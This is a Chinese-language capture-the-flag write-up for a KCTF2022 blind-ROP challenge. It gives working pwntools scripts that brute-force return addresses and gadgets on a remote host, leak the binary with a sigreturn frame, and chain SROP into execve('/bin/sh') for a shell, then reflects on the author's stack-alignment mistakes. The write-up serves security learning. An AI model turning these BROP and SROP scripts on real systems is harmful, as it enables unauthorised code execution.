# KCTF2022 春第六题 BROP

---

## 目录

[TOC]

---

## 信息收集

### 爆破低字节，函数基址

nc远程连接程序，接收到`hacker, TNT!\n`后等待用户输入，输入`A*16`后获得回馈`TNT TNT!\n`，输入`A*17`后连接断开，推测程序如下：

```C
void myRead(){
    char buf[8] = {0};
    read(0,buf,0x1000);
    return;
}
int main(){
    puts("hacker, TNT!");
    myRead()
    puts("TNT TNT!");
    return 0;
}
```

尝试爆破返回地址低字节，最终获得回馈如下

```css
『NORMAL HEAD』================>『0XB0』    
『STOP』================>『0XB5』         
『STOP』================>『0XB6』         
『STOP』================>『0XC9』           
『STOP』================>『0XED』
『STOP』================>『0XEE』        
『STOP』================>『0XEF』
『STOP』================>『0XF2』
『STOP』================>『0XF3』
『STOP』================>『0XD8』
```

再次尝试爆破基址得出`base=0X400000`，并且多次连接不会改变，推断程序没有开启`PIE`；构造rop尝试返回地址仅出现3种情况

- 程序进入等待（推测等待用户输入），输入后crash
- crash
- 正常流程执行，既返回到main或原定返回地址中



---

### 获取gadget

```python
def testRetRop(base):
    for i in range(base,base+0x1000):
        p,pb,libc = init(r="123.59.196.133:10012",log="info",lg=1)
        p.sendlineafter("hacker, TNT!\n",b"A"*0x10+p64(i)+p64(mainAddr))
        try:
            r = p.recvuntil("hacker, TNT!\n",timeout=0.1)
            if(r == b""):
                p.close()
                continue
            else:
                vLog("RET",i)
            p.close()
            continue
        except:
            p.close()
            continue

def testPopRop(base,c):
    for i in range(base,base+0x1000):
        p,pb,libc = init(r="123.59.196.133:10012",log="info",lg=1)
        p.sendlineafter("hacker, TNT!\n",b"A"*0x10+p64(i)+p64(0)*c+p64(mainAddr))
        try:
            r = p.recvuntil("hacker, TNT!\n",timeout=0.1)
            if(r == b""):
                p.close()
                continue
            else:
                vLog("POP {}".format(c),i)
            p.close()
            continue
        except:
            p.close()
            continue
```

最后得到如下结果

```css
『RET』================>『0X400101』
『RET』================>『0X400106』
『POP 2』================>『0X4000F5』
『POP 2』================>『0X4000FA』
『POP 2』================>『0X4000FB』
『POP 2』================>『0X4000FD』
『POP 2』================>『0X4000FE』
『POP 2』================>『0X400100』
『POP 2』================>『0X400102』
```

### 归纳&测试

经测试地址及指令如下

```css
『NORMAL HEAD』================>『0X4000B0』    main函数地址
『STOP』================>『0X4000C7』           syscall
『STOP』================>『0X4000C9』           call func
『STOP』================>『0X4000EE』           read ret
```



---

## 攻击测试 SROP

```python
###已知地址
mainAddr = 0X4000B0
readRet = 0X4000EE
sysCall = 0X4000c7
base = 0x400000

p,pb,libc = init(r="123.59.196.133:10053",log="debug",lg=0)

frame = SigreturnFrame()
frame.rip = sysCall
frame.rax = 1
frame.rdi = 1
frame.rsi = base
frame.rdx = 0x1000
frame.rsp = base
frame.rbp = base

p.sendlineafter("hacker, TNT!\n",b"A"*0x10+p64(readRet)+p64(sysCall)+bytes(frame))

sleep(0.1)
p.send(b"A"*15)
r = p.recv(0x578)
f = open("./pwn","wb")
f.write(r)
f.flush()

p.interactive()
```

最终成功泄露出程序

```assembly
4000B0 mov     eax, 1
4000B5 mov     rdi, rax                        ; fd
4000B8 mov     rsi, offset hello               ; buf
4000C2 mov     edx, 0Dh                        ; count
4000C7 syscall                                 ; LINUX - sys_write
4000C9 call    TNT66666
4000C9 
4000CE mov     eax, 1
4000D3 mov     rdi, rax                        ; error_code
4000D6 mov     rsi, offset byebye              ; "TNT TNT!\n"
4000E0 mov     edx, 9                          ; count
4000E5 syscall                                 ; LINUX - sys_write
4000E7 mov     eax, 3Ch ; '<'
4000EC syscall                                 ; LINUX - sys_exit
4000EC 
4000EC _start endp
4000EC 
4000EE 
4000EE ; =============== S U B R O U T I N E =======================================
4000EE 
4000EE 
4000EE TNT66666 proc near                      ; CODE XREF: _start+19↑p
4000EE sub     rsp, 10h
4000F2 xor     rax, rax
4000F5 mov     edx, 400h                       ; count
4000FA mov     rsi, rsp                        ; buf
4000FD mov     rdi, rax                        ; fd
400100 syscall                                 ; LINUX - sys_read
400102 add     rsp, 10h
400106 retn
400106 
400106 TNT66666 endp
```

写出拖进IDA分析后可知`.data`段是可写的，始于`0x600108`

## GetShell

经过泄露的程序进行分析之后更正`sysgadget`避免导致栈操作异常

`0x4000C7 => 0X400100`

```python
def pwn():
    bss = 0x600108
    readRet = 0X4000EE
    sysCall = 0X400100
    p,pb,libc = init(r="123.59.196.133:10018",log="debug",lg=0)
    #p,pb,libc = init(p="./tnt",log="debug",dbg=1)

    frame = SigreturnFrame()
    frame.rip = sysCall
    frame.rax = 0
    frame.rdi = 0
    frame.rsi = bss
    frame.rdx = 0x400
    frame.rsp = bss
    frame.rbp = bss # read(0,0x600108,0x400) ret 0x600108
    dLog("frame")
    sleep(0.1)
    p.sendafter("hacker, TNT!\n",p64(0xdeadbeef)*2+p64(readRet)+p64(sysCall)+bytes(frame))


    dLog("0xF 1")
    sleep(0.1)
    p.send(b"A"*15)
    
    sysFrame = SigreturnFrame()
    sysFrame.rip = sysCall
    sysFrame.rax = 59
    sysFrame.rdi = bss
    sysFrame.rsi = 0
    sysFrame.rdx = 0# system(0x600108,0,0)
    dLog("sysframe")
    sleep(0.1)
    p.send(b"/bin/sh\x00"+p64(0)+p64(readRet)+p64(sysCall)+bytes(sysFrame))

    dLog("0xF 2")
    sleep(0.1)
    p.send(b"A"*15)
    
    p.interactive()
    # flag{ad2e859c-45fd-404c-96b4-f8c9e2bf7187}
```

---

## 总结

因为`SROP`的题做的少，并且也是第一次做`BROP`，所以还是踩了非常多的坑

### 1. 喜欢猜

首先就是投入了过多的事件去猜测而非测试，在循环测试`popgadget`的时候总是纠结于去根据其指令长度去猜测具体指令

### 2.泄露了程序结果还在用不确定的gadget

有明确的地址和指令不看结果还在用遍历出来的不确定的gadget，导致做了很多未知的操作而影响exploit



### 详细踩坑经过

先看两段payload

```python
bss = 0x600108
readRet = 0X4000EE
sysCall = 0X400100
payloadA = p64(0xdeadbeef)*2  + p64(readRet)    + p64(sysCall) + bytes(frame)
payloadB = b"/bin/sh\x00"     + p64(0xdeadbeef) + p64(readRet) + p64(sysCall) + bytes(sysFrame)
```

#### payloadA

首先两段死牛肉是padding，readRet也无异常，不破坏栈平衡，从sysCall开始导致我踩坑，看汇编

```assembly
400100 0F 05                         syscall                                 ; LINUX - sys_read
400102 48 83 C4 10                   add     rsp, 10h
400106 C3                            retn
```

是的，在系统调用完还有一个`add rsp,10h`的操作呢

而由`SROPA->read(0,0x600108,0x400)`可知当`SropA`执行完后实际上我的`rsp`需要越过`sh`字符串进而指向`readRet`，于是我在忽视了上述栈平衡操作的情况下进行了如下的`srop`布置

```python
frame.rsi = bss
frame.rsp = bss+8
```

但是由于`add rsp, 10h`的存在，导致`srop`默认既为

```python
frame.rsp = bss+0x10
```

所以我非但不能给`rsp+8`，我还得在`payloadB->sh`后面填上一坨死牛肉，才不会影响程序流程

#### payloadB

这里没啥问题的，迎合`add rsp, 10h`再加个死牛肉就好了